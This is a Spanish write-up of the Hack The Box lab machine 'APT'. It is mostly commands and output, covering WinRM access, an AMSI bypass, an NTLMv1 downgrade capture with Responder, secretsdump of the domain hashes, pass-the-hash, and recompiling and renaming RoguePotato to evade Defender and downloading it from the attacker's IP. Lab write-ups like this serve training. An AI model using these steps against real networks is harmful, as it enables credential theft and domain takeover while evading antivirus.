+SMB         APT             5985   APT              [*] Windows 10.0 Build 14393 (name:APT) (domain:htb.local)
+HTTP        APT             5985   APT              [*] http://APT:5985/wsman
+WINRM       APT             5985   APT              [+] htb.local\henry.vinson_adm:G1#Ny5@2dvht (Pwn3d!)
+```
+
+Y gano acceso al sistema
+
+```null
+evil-winrm -i APT -u 'henry.vinson_adm' -p 'G1#Ny5@2dvht'
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents> ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet:
+
+   Connection-specific DNS Suffix  . : htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::250
+   IPv6 Address. . . . . . . . . . . : dead:beef::786c:1b92:6f0:da53
+   IPv6 Address. . . . . . . . . . . : dead:beef::b885:d62a:d679:573f
+   Link-local IPv6 Address . . . . . : fe80::786c:1b92:6f0:da53%5
+   IPv4 Address. . . . . . . . . . . : 10.10.10.213
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : dead:beef::1
+                                       fe80::250:56ff:feb9:b080%5
+                                       10.10.10.2
+*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents> 
+```
+
+Dentro del escritorio está la primera flag
+
+```null
+*Evil-WinRM* PS C:\Users\henry.vinson_adm\Desktop> type user.txt
+9463c68886ee921a2436d6ed90c34aaa
+```
+
+# Escalada
+
+No estoy en ningún grupo especial
+
+```null
+*Evil-WinRM* PS C:\Users\henry.vinson_adm\Desktop> net user henry.vinson_adm
+User name                    henry.vinson_adm
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            9/24/2020 7:23:05 AM
+Password expires             Never
+Password changeable          9/24/2020 7:23:05 AM
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   10/23/2020 10:01:51 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Domain Users
+The command completed successfully.
+```
+
+En la raiz hay un directorio scripts, pero no tengo accesoo
+
+```null
+*Evil-WinRM* PS C:\scripts> dir
+Access to the path 'C:\scripts' is denied.
+At line:1 char:1
++ dir
++ ~~~
+    + CategoryInfo          : PermissionDenied: (C:\scripts:String) [Get-ChildItem], UnauthorizedAccessException
+    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
+```
+
+Tampoco tengo ni privilegio del que pueda abusar
+
+```null
+*Evil-WinRM* PS C:\> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+```
+
+No puedo ver la arquitectura del sistema
+
+```null
+*Evil-WinRM* PS C:\Temp> systeminfo
+Program 'systeminfo.exe' failed to run: Access is deniedAt line:1 char:1
++ systeminfo
++ ~~~~~~~~~~.
+At line:1 char:1
++ systeminfo
++ ~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
+    + FullyQualifiedErrorId : NativeCommandFailed
+```
+
+Para saber si estoy en 64 bits o 32 bits, utilizo una sentencia en Powershell
+
+```null
+*Evil-WinRM* PS C:\Temp> [Environment]::Is64BitOperatingSystem
+True
+*Evil-WinRM* PS C:\Temp> [Environment]::Is64BitProcess
+True
+```
+
+En caso de que no estuviera en un proceso de 64bits, prodría lanzar directamente la powershell nativa del sistema
+
+Subo el WinPeas para aplicar reconocimiento
+
+```null
+*Evil-WinRM* PS C:\Temp> upload /opt/winpeas.exe
+Info: Uploading /opt/winpeas.exe to C:\Temp\winpeas.exe
+
+                                                             
+Data: 2624852 bytes of 2624852 bytes copied
+
+Info: Upload successful!
+```
+
+Si trato de ejecutarlo, me salta el Defender
+
+```null
+*Evil-WinRM* PS C:\Temp> ./winpeas.exe
+Program 'winpeas.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
++ ./winpeas.exe
++ ~~~~~~~~~~~~~.
+At line:1 char:1
++ ./winpeas.exe
++ ~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
+    + FullyQualifiedErrorId : NativeCommandFailed
+```
+
+Podría tratar de bypassearlo con una utilidad de evil-winrm, que se encarga de hacer un Bypass-4MSI para desactivar AMSI
+
+Esto se encarga de inyectar directamente el programa en memoria para así no tener que ejecutarlo
+
+```null
+*Evil-WinRM* PS C:\Temp> menu
+
+   ,.   (   .      )               "            ,.   (   .      )       .   
+  ("  (  )  )'     ,'             (     '    ("     )  )'     ,'   .  ,)  
+.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
+_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
+\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
+ |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
+ |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
+/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
+        \/                               \/          \/       \/         \/
+
+       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers
+[+] Dll-Loader 
+[+] Donut-Loader 
+[+] Invoke-Binary
+[+] Bypass-4MSI
+[+] services
+[+] upload
+[+] download
+[+] menu
+[+] exit
+```
+
+```null
+*Evil-WinRM* PS C:\Temp> Bypass-4MSI
+
+Info: Patching 4MSI, please be patient...
+
+[+] Success!
+```
+
+Una vez cargado, reportará todo el output de golpe
+
+```null
+*Evil-WinRM* PS C:\Temp> Invoke-Binary /opt/winpeas.exe
+```
+
+Encuentra un histórico de PowerShell
+
+```null
+╔══════════╣ Found History Files
+File: C:\Users\henry.vinson_adm\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
+
+Su contenido es el siguiente:
+
+```null
+$Cred = get-credential administrator
+invoke-command -credential $Cred -computername localhost -scriptblock {Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" lmcompatibilitylevel -Type DWORD -Value 2 -Force}
+```
+
+Destaca el argumento lmcompatibilitylevel
+
+Según este [Post](https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/lmcompatibilitylevel/using-get-ntlmv1logonevents-ps1/), hace referencia a una autenticación utilzando el prototocolo NTLMv1, que es criptografía leve y puede ser crítico
+
+En caso de poder interceptar el Account System, y obtengo el hash NetNTLMv1 a partir del cual puedo convertirlo en su hash NT, con secretsdump puedo dumpear todos los hashes NT del Directorio Activo
+
+En este [artículo](https://crack.sh/netntlm/) explican como se puede efectuar el ataque
+
+Una cosa a tener en cuenta es que este tipo de hashes necesita un desafío para poder romperse, esta página utiliza el 1122334455667788 y mediante rainbow tables devuelve el resultado. Al tratarse de un CTF diseñado para ser vulnerable, lo más probable es que coincida, pero en un entorno real habría que encontrar la manera de conseguirlo
+
+Por defecto, el Responder utiliza un desafío aleatorio. Esto se puede ver en /etc/responder/Responder.conf
+
+```null
+; Use "Random" for generating a random challenge for each requests (Default)
+Challenge = Random
+```
+
+Para que todo funcione correctamente y se pueda crackear, hay que cambiar el desafío por el que se muestra en el artículo
+
+```null
+; Use "Random" for generating a 
+Challenge = Random
+; Challenge = 1122334455667788
+```
+
+En el panel de ayuda del Responder, se puede ver el parámetro que hay que introducir para aplicar el downgrade del hash, en caso contrario estaría en escucha de un NetNTLMv2
+
+```null
+  --lm                  Force LM hashing downgrade for Windows XP/2003 and
+                        earlier. Default: False
+```
+
+Una forma de obtener el Account System, teniendo en cuenta que está el Defender habilitado, sería utilizando un binario el cual no contenga esas restricciones, ya que si intento cargar un recurso compartido a nivel de red de mi lado, no voy a recibir nada
+
+<img src="/writeups/assets/img/APT-htb/6.png" alt="">
+
+Lo más sencillo, sería que con el propio Windows Defender, escanear un recurso proviniente de un tercero, ya que la tarea que se va a ejecutar es privilegiada y como se va a producir una autenticación, el Account System lo voy a ver reflejado en el Responder
+
+```null
+*Evil-WinRM* PS C:\Program Files\Windows Defender> ./MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.16.6\test
+Scan starting...
+CmdTool: Failed with hr = 0x80508023. Check C:\Users\HENRY~2.VIN\AppData\Local\Temp\MpCmdRun.log for more information
+```
+
+Y recibo el hash del Account System
+
+```null
+responder -I tun0 --lm
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+
+  To support this project:
+  Patreon -> https://www.patreon.com/PythonResponder
+  Paypal  -> https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [ON]
+    Force ESS downgrade        [ON]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.16.6]
+    Responder IPv6             [dead:beef:4::1004]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-0IQLBIYXK9X]
+    Responder Domain Name      [HS45.LOCAL]
+    Responder DCE-RPC Port     [47475]
+
+[+] Listening for events...
+
+[SMB] NTLMv1 Client   : 10.10.10.213
+[SMB] NTLMv1 Username : HTB\APT$
+[SMB] NTLMv1 Hash     : APT$::HTB:8C6A39A474B8156531371866568DFB4E28E6801E56216F3C:8C6A39A474B8156531371866568DFB4E28E6801E56216F3C:bcb02bf820bb9952
+[*] Skipping previously captured hash for HTB\APT$
+[*] Skipping previously captured hash for HTB\APT$
+[*] Skipping previously captured hash for HTB\APT$
+[*] Skipping previously captured hash for HTB\APT$
+[*] Skipping previously captured hash for HTB\APT$
+[*] Skipping previously captured hash for HTB\APT$
+[*] Skipping previously captured hash for HTB\APT$
+[+] Exiting...
+```
+
+Pero claro, este es no es un hash NetNTLMv1, pero si que lo puedo adaptar y convertirlo con la herramienta ntlmv1-multi
+
+```null
+git clone https://github.com/evilmog/ntlmv1-multi
+```
+
+Para ejecutarlo:
+
+```null
+python3 ntlmv1.py --ntlmv1 'APT$::HTB:8C6A39A474B8156531371866568DFB4E28E6801E56216F3C:8C6A39A474B8156531371866568DFB4E28E6801E56216F3C:bcb02bf820bb9952'
+Hashfield Split:
+['APT$', '', 'HTB', '8C6A39A474B8156531371866568DFB4E28E6801E56216F3C', '8C6A39A474B8156531371866568DFB4E28E6801E56216F3C', 'bcb02bf820bb9952']
+
+Hostname: HTB
+Username: APT$
+Challenge: bcb02bf820bb9952
+LM Response: 8C6A39A474B8156531371866568DFB4E28E6801E56216F3C
+NT Response: 8C6A39A474B8156531371866568DFB4E28E6801E56216F3C
+CT1: 8C6A39A474B81565
+CT2: 31371866568DFB4E
+CT3: 28E6801E56216F3C
+
+To Calculate final 4 characters of NTLM hash use:
+./ct3_to_ntlm.bin 28E6801E56216F3C bcb02bf820bb9952
+
+To crack with hashcat create a file with the following contents:
+8C6A39A474B81565:bcb02bf820bb9952
+31371866568DFB4E:bcb02bf820bb9952
+
+echo "8C6A39A474B81565:bcb02bf820bb9952">>14000.hash
+echo "31371866568DFB4E:bcb02bf820bb9952">>14000.hash
+
+To crack with hashcat:
+./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset 14000.hash ?1?1?1?1?1?1?1?1
+
+To Crack with crack.sh use the following token
+$NETLM$bcb02bf820bb9952$8C6A39A474B8156531371866568DFB4E28E6801E56216F3C
+```
+
+Esto proporciona un token que en caso de proporcionarselo a la web [crack.sh](https://crack.sh/get-cracking), a través de un correo electrónico devuelve el hash NT y posteriormente dumpear el resto con secretsdump
+
+<img src="/writeups/assets/img/APT-htb/7.png" alt="">
+
+Una vez recibido el hash NT, puedo dumpear el resto con secretsdump
+
+```null
+secretsdump.py -hashes :d167c3238864b12f5f82feae86a7f798 'htb.local/APT$@htb.local'
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::
+henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::
+APT$:1001:aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:72f9fc8f3cd23768be8d37876d459ef09ab591a729924898e5d9b3c14db057e3
+Administrator:aes128-cts-hmac-sha1-96:a3b0c1332eee9a89a2aada1bf8fd9413
+Administrator:des-cbc-md5:0816d9d052239b8a
+krbtgt:aes256-cts-hmac-sha1-96:b63635342a6d3dce76fcbca203f92da46be6cdd99c67eb233d0aaaaaa40914bb
+krbtgt:aes128-cts-hmac-sha1-96:7735d98abc187848119416e08936799b
+krbtgt:des-cbc-md5:f8c26238c2d976bf
+henry.vinson:aes256-cts-hmac-sha1-96:63b23a7fd3df2f0add1e62ef85ea4c6c8dc79bb8d6a430ab3a1ef6994d1a99e2
+henry.vinson:aes128-cts-hmac-sha1-96:0a55e9f5b1f7f28aef9b7792124af9af
+henry.vinson:des-cbc-md5:73b6f71cae264fad
+henry.vinson_adm:aes256-cts-hmac-sha1-96:f2299c6484e5af8e8c81777eaece865d54a499a2446ba2792c1089407425c3f4
+henry.vinson_adm:aes128-cts-hmac-sha1-96:3d70c66c8a8635bdf70edf2f6062165b
+henry.vinson_adm:des-cbc-md5:5df8682c8c07a179
+APT$:aes256-cts-hmac-sha1-96:4c318c89595e1e3f2c608f3df56a091ecedc220be7b263f7269c412325930454
+APT$:aes128-cts-hmac-sha1-96:bf1c1795c63ab278384f2ee1169872d9
+APT$:des-cbc-md5:76c45245f104a4bf
+[*] Cleaning up... 
+```
+
+Me conecto a la máquina como el usuario Administrador
+
+```null
+❯ evil-winrm -i APT -u 'Administrator' -H 'c370bddf384a691d811ff3495e8a72e2'
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+```
+
+Y puedo ver la segunda flag
+
+```null
+*Evil-WinRM* PS C:\Users\Administrator> type C:\Users\Administrator\Desktop\root.txt
+ccfdc1e28f340cdbfe0e5049f913088d
+```
+
+Existe otra manera de rootear la máquina pero en vez de por SMB, por RPC
+
+## Escalada (Forma difícil)
+
+Por lo que he leido en otros writeups, esta era la manera intencionada de hacer la máquina
+
+Necesito utilizar RoguePotato, pero los que controláis medianamente de Directorio Activo, os habréis fijado que el usuario henry.vinson_adm no tiene el privilegio SeImpersonatePrivilege, pero aquí lo importante es hacer una llamada por RPC. Un problema a tener en cuenta es que por defecto el SMB no está habilitado en IPv4, por lo que tendré que volver a compilar el binario con las actualizaciones pertinentes.
+
+Para ello, voy a virtualizar una máquina Windows con el Visual Studio instalado, junto a las extensiones para trabajar en C++ y modificar el proyecto para opere por IPv6
+
+Desde mi máquina Linux, descargo el proyecto de Github y lo comparto por Samba a la Windows
+
+```null
+git clone https://github.com/antonioCoco/RoguePotato
+smbserver.py shared $(pwd) -smb2support -user rubbx -password rubbx
+```
+
+En la máquina Windows, creo una unidad lógica x: que se sincronice con mi recurso compartido
+
+```null
+PS C:\Users\Usuario> net use x: \\10.10.0.130\shared /user:rubbx rubbx
+Se ha completado el comando correctamente.
+```
+
+Copio el proyecto al escritorio y desactivo el Windows Defender para que no entre en conflicto
+
+<img src="/writeups/assets/img/APT-htb/8.png" alt="">
+
+Dentro está el proyecto de Visual Studio que tengo que abrir
+
+<img src="/writeups/assets/img/APT-htb/9.png" alt="">
+
+Si todo está instalado correctamente, al abrir el proyecto debe aparecer lo siguiente:
+
+<img src="/writeups/assets/img/APT-htb/10.png" alt="">
+
+En el explorador de soluciones, busco por el el archivo IStorageTrigger.cpp. Su función principal es convertir cadenas de texto a formato bytes
+
+<img src="/writeups/assets/img/APT-htb/11.png" alt="">
+
+```null
+HRESULT IStorageTrigger::MarshalInterface(IStream* pStm, const IID& riid, void* pv, DWORD dwDestContext, void* pvDestContext, DWORD mshlflags) {
+	short sec_len = 8;
+	char remote_ip_mb[16];
+	wcstombs(remote_ip_mb, remote_ip, 16);
+	char* ipaddr = remote_ip_mb;
+	unsigned short str_bindlen = (unsigned short)((strlen(ipaddr)) * 2) + 6;
+	unsigned short total_length = (str_bindlen + sec_len) / 2;
+	unsigned char sec_offset = str_bindlen / 2;
+```
+
+Se puede ver una función en la que se declara un array de longitud de 16 bytes. Esto para una dirección IPv4 no hay ningún problema, ya que no sobrepasa el espacio asignado. Se calcula en función de los caracteres. Una dirección IPv4 tiene 4 grupos de hasta 3 caracteres. Contando con los puntos suman 15, pero como no es divisible entre dos se le añade un null byte para evitar problemas. Sin embargo, para direcciones IPv6, la longitud no debe ser 16, si no como son 8 grupos de de 4 caracteres, en total 32, y hay que sumarle los puntos, por lo que se queda en 40 bytes
+
+Debería tener la siguiente forma:
+
+```null
+HRESULT IStorageTrigger::MarshalInterface(IStream* pStm, const IID& riid, void* pv, DWORD dwDestContext, void* pvDestContext, DWORD mshlflags) {
+	short sec_len = 8;
+	char remote_ip_mb[40];
+	wcstombs(remote_ip_mb, remote_ip, 40);
+	char* ipaddr = remote_ip_mb;
+	unsigned short str_bindlen = (unsigned short)((strlen(ipaddr)) * 2) + 6;
+	unsigned short total_length = (str_bindlen + sec_len) / 2;
+	unsigned char sec_offset = str_bindlen / 2;
+```
+
+Una vez cambiado esto, puedo recompilo el proyecto y obtener el binario que tengo que subir a la máquina víctima
+
+<img src="/writeups/assets/img/APT-htb/12.png" alt="">
+
+Tras hacer el rebuild, hay cambio a esa versión y la depuro
+
+<img src="/writeups/assets/img/APT-htb/13.png" alt="">
+
+<img src="/writeups/assets/img/APT-htb/14.png" alt="">
+
+El compilador devuelve la ruta donde se ha almacenado el binario
+
+```null
+'RoguePotato.exe' (Win32): 'C:\Users\Usuario\Desktop\RoguePotato\x64\Release\RoguePotato.exe' cargado. El módulo se compiló sin símbolos.
+```
+
+Lo transfiero a mi máquina linux y lo subo a la máquina víctima
+
+```null
+*Evil-WinRM* PS C:\Temp> upload /home/rubbx/Desktop/HTB/Machines/APT/RoguePotato.exe
+Info: Uploading /home/rubbx/Desktop/HTB/Machines/APT/RoguePotato.exe to C:\Temp\RoguePotato.exe
+
+                                                             
+Data: 161108 bytes of 161108 bytes copied
+
+Info: Upload successful!
+```
+
+Si lo trato de ejecutar me detecta que no es un binario
+
+```null
+*Evil-WinRM* PS C:\Temp> .\RoguePotato.exe
+Program 'RoguePotato.exe' failed to run: The specified executable is not a valid application for this OS platform.At line:1 char:1
++ .\RoguePotato.exe
++ ~~~~~~~~~~~~~~~~~.
+At line:1 char:1
++ .\RoguePotato.exe
++ ~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
+    + FullyQualifiedErrorId : NativeCommandFailed
+```
+
+Esto puede ser porque evil-winrm utiliza un encoder utf-16 en little endian o similar que corrompe los magic numbers del archivo y Windows no lo reconoce. En cambio, si lo transifero por http, no tengo ese problema
+
+Desde mi máquina Windows, monto un servicio http con python
+
+```null
+python3 -m http.server 80
+```
+
+Desde la máquina víctima, utilizo Invoke-WebRequest para descargarlo
+
+```null
+*Evil-WinRM* PS C:\Temp> iwr -uri http://10.10.16.6/RoguePotato.exe -o RoguePotato.exe
+```
+
+Al tratar de ejecutarlo, el Defender lo detecta
+
+```null
+*Evil-WinRM* PS C:\Temp> .\RoguePotato.exe
+Program 'RoguePotato.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
++ .\RoguePotato.exe
++ ~~~~~~~~~~~~~~~~~.
+At line:1 char:1
++ .\RoguePotato.exe
++ ~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
+    + FullyQualifiedErrorId : NativeCommandFailed
+```
+
+Podría volver a utilizar el Bypass-4MSI, pero para ver otras formas de evadir el Defender, voy a lo complicado
+
+En la máquina Windows, busco el panel de ayuda del binario, para borrar y escribir cualquier otra cosa. En muchas ocasiones, Windows Defender bloquea ciertos programas según los nombres de funciones, cadenas de caracteres imprimibles o comentarios
+
+Para ello me dirijo al comienzo del programa, en la función del panel de ayuda
+
+<img src="/writeups/assets/img/APT-htb/15.png" alt="">
+
+Y quedaría todo muy simplificado
+
+```null
+void Usage()
+{
+	printf("\n\n\tCualquier cosa\n\n\n");
+}
+```
+
+Vuelvo a compilar, ejecutar y transferirlo a la máquina víctima
+
+Pero sigue detectando un virus
+
+```null
+*Evil-WinRM* PS C:\Temp> .\RoguePotato.exe
+Program 'RoguePotato.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
++ .\RoguePotato.exe
++ ~~~~~~~~~~~~~~~~~.
+At line:1 char:1
++ .\RoguePotato.exe
++ ~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
+    + FullyQualifiedErrorId : NativeCommandFailed
+```
+
+Si le hago un Strings y filtro por Potato, detecta coincidencias
+
+```null
+strings RoguePotato.exe | grep -i potato
+RoguePotato
+[+] Starting RoguePotato...
+```
+
+Hago una búsqueda recursiva y remplazo todo lo que tenga ese nombre para que no de problemas
+
+<img src="/writeups/assets/img/APT-htb/16.png" alt="">
+
+Vuelvo a compilar y lo subo a la máquina víctima
+
+Ahora al hacer un strings no detecta esas cadenas
+
+```null
+strings RoguePotato.exe | grep -i potato
+```
+
+Lo sigue detectando como malicioso
+
+```null
+*Evil-WinRM* PS C:\Temp> .\RoguePotato.exe
+Program 'RoguePotato.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
++ .\RoguePotato.exe
++ ~~~~~~~~~~~~~~~~~.
+At line:1 char:1
++ .\RoguePotato.exe
++ ~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
+    + FullyQualifiedErrorId : NativeCommandFailed
+```
+
+En los ajustes de compilación, viene predeterminado optimizar con respecto a la velocidad. Lo cambio al tamaño para poder borrar así restos que no afecten a la ejecución del programa pero que sí pueden ser rastreados
+
+<img src="/writeups/assets/img/APT-htb/17.png" alt="">
+
+Ahora ya puedo ejecutarlo
+
+Para comprobar de una manera más rápida si el binario lo va a detectar como malicioso o no, desde [Virustotal](https://www.virustotal.com/gui/home/upload) filtrando por Microsoft se puede saber
+
+<img src="/writeups/assets/img/APT-htb/18.png" alt="">
+
+Y ahora ejecuta sin problemas
+
+```null
+*Evil-WinRM* PS C:\Temp> .\RoguePotato.exe
+
+
+	Cualquier cosa
+
+
+```
+
+Después de todo, ya tengo subido el binario con soporte para IPv6 y sin que lo detecte Windows Defender
+
+Me pongo en escucha por el puerto 135 (RPC)
+
+Copio mi IPv6 se la paso como argumento al RoguePotato
+
+Recibo la petición al puerto 135 y al montar un servicio RPC con impacket y recibo el hash NetNTLMv1
+
+```null
+*Evil-WinRM* PS C:\Temp> .\RoguePotato.exe -r e80::7b96:147d:d784:8491 -e cmd
+[+] Starting CualquierCosa...
+[!] RogueOxidResolver not run locally. Ensure you run it on your remote machine
+[*] Creating Pipe Server thread..
+[*] Creating TriggerDCOM thread...
+[*] Listening on pipe \\.\pipe\CualquierCosa\pipe\epmapper, waiting for client to connect
+[*] Calling CoGetInstanceFromIStorage with CLSID:{4991d34b-80a1-4291-83b6-3328366b9097}
+[*] IStoragetrigger written:130 bytes
+[-] Named pipe didn't received any connect request. Exiting ...
+```
+
